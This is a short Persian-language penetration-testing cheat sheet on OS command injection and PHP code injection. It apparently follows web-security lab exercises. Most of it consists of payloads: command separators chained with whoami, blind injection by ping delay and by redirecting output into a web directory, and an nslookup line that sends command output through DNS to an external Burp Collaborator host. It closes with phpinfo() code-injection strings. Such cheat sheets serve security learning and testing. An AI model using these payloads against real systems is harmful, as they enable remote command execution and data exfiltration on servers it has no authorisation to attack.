# Remote Command Execution

## Concept
- در بخش های زیر به دنبال این آسیب پذیری می گردیم :
  - انتخاب یک آیتم از درون dropdown box
    - باید برای تغییر این پارامتر و نیز مشاهده تاثیر در پاسخ، حتما از Burp استفاده کنیم
  - درون فیلدهای بخش ثبت نظرات که ممکن است از دستورات سیستمی برای پردازش اطلاعات کاربر (مانند ایمیل) استفاده شده باشد
    - هنگام استفاده از Burp باید حتما URL Encoding داشته باشیم (مثلا به جای فاصله از + استفاده کنیم)

## Payloads
```
;whoami
;%20whoami
&whoami
&&whoami
|whoami
||whoami
%0Awhoami
```

## Blind OS Command Injection
- **Time delays**
    - ```x||ping+-c+10+127.0.0.1||```
    - <p align="right">در این حالت پس از اجرای دستور فوق، 10 ثانیه طول می کشد تا response را در مرورگر مشاهده کنیم</p> 

- **Output redirection**
    - ```||whoami>/var/www/images/output.txt||```
    - <p align="right">عکس ها در مسیر فوق ذخیره شده اند، در این حالت، خروجی دستور در مسیر share شده ذخیره می گردد و بعدا می توانیم یکی از عکس های محصولات را باز کرده، سپس نام  فایل را با نام output.txt تغییر دهیم، تا نتیجه دستور را مشاهده کنیم</p>

- **Out-of-band interaction**
    - ```x||nslookup+7goyqnfizle0fk6mj5zk5qjtrkxalz.burpcollaborator.net```
    - <p align="right">در اینحالت سرور می تواند به یک آدرس بیرونی وصل شود، برای بررسی از Burp Collaborator استفاده می کنیم </p>

- **Out-of-band data exfilteration**
    - ```||nslookup+`whoami`.x0y8fg1javlrivvsd4hp2koh58byzn.burpcollaborator.net||```
    - <p align="right">در اینحالت می خواهیم نتیجه دستور در کوئری DNS به سمت سرور مهاجم در اینترنت ارسال شود، که در اینجا از Burp Collaborator استفاده شده (باید بر روی Pull now کلیک شود) و خروجی به شکل زیر خواهد بود.</p>
    - ```peter-jSRUyX.x0y8fg1javlrivvsd4hp2koh58byzn.burpcollaborator.net.burpcollaborator.net```
# Code Execution

## Payload
```
a";phpinfo();//
a".phpinfo();//
a);}phpinfo();//
```

## Sample PHP executable
- https://www.php.net/manual/en/function.shell-exec.php

